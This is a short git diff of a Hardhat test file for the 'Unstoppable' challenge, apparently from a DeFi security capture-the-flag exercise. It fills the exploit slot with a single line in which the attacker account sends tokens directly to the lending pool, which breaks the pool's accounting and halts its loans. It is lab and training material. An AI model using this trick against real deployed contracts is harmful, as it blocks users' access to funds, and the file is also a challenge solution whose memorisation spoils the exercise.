@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require('ethers');
 
 describe('[Challenge] Unstoppable', function () {
     let deployer, attacker, someUser;
@@ -40,6 +41,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, 10);
     });
 
     after(async function () {
